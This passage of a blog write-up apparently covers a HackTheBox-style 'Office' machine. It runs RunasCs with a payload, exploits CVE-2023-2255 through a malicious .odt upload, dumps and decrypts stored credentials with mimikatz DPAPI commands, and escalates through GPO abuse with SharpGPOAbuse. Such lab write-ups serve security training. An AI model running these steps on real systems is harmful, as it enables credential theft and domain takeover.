+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_16.png" alt="Untitled" /></p>
+
+<p>We use RunasCs</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_17.png" alt="Untitled" /></p>
+
+<p>Set the session</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_18.png" alt="Untitled" /></p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="err">\</span><span class="nx">RunasCs</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">user</span> <span class="nx">password</span> <span class="nx">payload</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_19.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_20.png" alt="Untitled" /></p>
+
+<p>User got it!!</p>
+
+<h2 id="3-priv-esc">3: Priv esc</h2>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">netstat</span> <span class="o">-</span><span class="nx">avn</span> 
+</code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_21.png" alt="Untitled" /></p>
+
+<p>8083 Is sometimes used to host web services</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_22.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_23.png" alt="Untitled" /></p>
+
+<p>Go ahead to port forwarding</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_24.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_25.png" alt="Untitled" /></p>
+
+<p>We were right a web service with a section to upload documents</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_26.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_27.png" alt="Untitled" /></p>
+
+<p>This interface allows user to upload .odt files and we know this can be vulnerable to</p>
+
+<ul>
+  <li>
+    <p>(CVE-2023-2255)</p>
+
+    <p>Improper access control in editor components of The Document Foundation LibreOffice allowed and attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used “floating frames” linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the tratment of other linked content in LibreOffice.</p>
+  </li>
+</ul>
+
+<ol>
+  <li>Create a evil .exe to call later exploiting the vulnerability</li>
+</ol>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_28.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Once you load the file on the victim machine create the evil .odt we also can make remote command execution.</li>
+</ol>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_29.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Set the session</li>
+</ol>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_30.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Upload the maliciuous .odt files</li>
+</ol>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_31.png" alt="Untitled" /></p>
+
+<hr />
+
+<p>That’s how we made successful lateral movement and we got a shell as ppots user</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Command used to list all stored credentials </span><span class="w">
+</span><span class="c">#or credentials that have been saved on the system</span><span class="w">
+</span><span class="c">#Target: The name or address of the resource of the saved creds</span><span class="w">
+</span><span class="c">#Type: Type of credentials</span><span class="w">
+</span><span class="c">#User: Users</span><span class="w">
+</span><span class="n">cmdkey</span><span class="w"> </span><span class="nx">/list</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_32.png" alt="Untitled" /></p>
+
+<p>mimikatz a powerful post-explotation tool commonly used in penetration testing</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_33.png" alt="Untitled" /></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#/a:h list the hidden files</span><span class="w">
+</span><span class="c">#Route: It generally save user credentials and other auth info</span><span class="w">
+</span><span class="n">dir</span><span class="w"> </span><span class="nx">/a:h</span><span class="w"> </span><span class="nx">C:\Users\Ppots\AppData\Roaming\Microsoft\Credentials</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_34.png" alt="Untitled" /></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Extract and show protected stored credentials using (Data Protection API)</span><span class="w">
+</span><span class="n">dpapi:cred</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_35.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_36.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_37.png" alt="Untitled" /></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#List secondary elements</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_38.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_39.png" alt="Untitled" /></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#This command is used to search and extract mastrer keys from DPAPI</span><span class="w">
+</span><span class="n">dpapi:masterkey</span><span class="w"> </span><span class="nx">/in</span><span class="s2">"route"</span><span class="w"> </span><span class="nx">/rpc</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_40.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_41.png" alt="Untitled" /></p>
+
+<p>Decrypt password</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">Left</span>
+<span class="o">/</span><span class="nx">unprotect</span> <span class="o">/</span><span class="nx">masterkey</span><span class="p">:</span><span class="o">&lt;</span><span class="nx">masterkey</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_42.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_43.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_44.png" alt="Untitled" /></p>
+
+<p>Successful lateral movement</p>
+
+<ul>
+  <li>We can download bloodhound files which can helps us with a final recognition process, this tool is used to identify and explore relationships inside a Active Directory environment</li>
+</ul>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_45.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_46.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_47.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_48.png" alt="Untitled" /></p>
+
+<p>Only numer Password neo4j</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_49.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_50.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_51.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_52.png" alt="Untitled" /></p>
+
+<p>We can see that HHOGAN is a member of managers so</p>
+
+<p>(As a member of the GPO Managers group, HHogan user May be granted permission to modify, create or link Group Policy objects, because the GPO Managers@office.htb group is a security group in AD and usually contains users with permissions to manage Group Policy objects (GPOs))</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Used to retrieve all Group Policy Objets</span><span class="w">
+</span><span class="n">Get-GPO</span><span class="w"> </span><span class="nt">-All</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Displayname</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_53.png" alt="Untitled" /></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddlocalAdmin</span><span class="w"> </span><span class="nt">--UserAccount</span><span class="w"> </span><span class="nx">HHogan</span><span class="w"> </span><span class="nt">--GPOname</span><span class="w"> </span><span class="s2">"Default Domain Controllers Policy"</span><span class="w">
+</span><span class="n">gpupdate</span><span class="w"> </span><span class="nx">/force</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_54.png" alt="Untitled" /></p>
+
+<p>It is uploaded but if we want to make it valid on system we will need to exit the evil-winrm session and reopen it.</p>
+
+<p>Machine pwned!!!</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/10/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87.html';
+     this.page.identifier = '/writeups/2025/07/10/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87';
+     this.page.title = 'Office fb98949d426941feb525ffda5de0984e';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
